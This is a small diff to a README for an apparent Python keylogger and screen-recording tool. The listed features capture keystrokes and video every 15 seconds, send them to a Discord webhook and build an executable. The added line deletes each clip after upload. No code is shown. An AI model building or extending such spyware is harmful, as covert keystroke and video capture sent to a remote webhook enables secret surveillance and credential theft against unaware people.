@@ -11,6 +11,7 @@ Features:
 - Captures keyboard input every 15 seconds.
 - records video clips every 15 seconds.
 - Sends captured data to a user-specified Discord webhook.
+- Deletes recorded video clip once sent to a user-specified Discord webhook
 - Supports compilation into an executable file using PyInstaller.
 
 Setup Instructions:
